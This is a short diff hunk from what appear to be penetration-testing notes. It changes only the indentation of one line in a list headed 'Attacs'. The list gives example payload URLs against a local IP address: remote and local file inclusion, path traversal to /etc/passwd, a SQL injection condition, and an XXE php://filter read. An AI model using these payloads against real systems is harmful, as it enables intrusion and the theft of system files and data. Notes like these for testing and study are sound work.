@@ -72,7 +72,7 @@ cat  /var/log/nginx/access.log
 ## Attacs
 * RFI http://192.168.1.44/vuln_page.php?file=http://192.168.1.44/backdoor_
 * LFI http://192.168.1.44/vuln.php?data=O:8:%22Example1%22:1:{s:10:%22cache_file%22;s:15:%22../../index.php%22;}
- * http://192.168.1.44/script.php?page=../../../../../../../../etc/passwd
+        * http://192.168.1.44/script.php?page=../../../../../../../../etc/passwd
 * SQLI https://192.168.1.44/?id=3 or 'a'='a'
 * Monitoring http://192.168.1.44/var/log/nginx/monitoring.log
 * Component http://192.168.1.44/rabia.php?xml=%3C!ENTITY%20ac%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php%22%3E]%3E
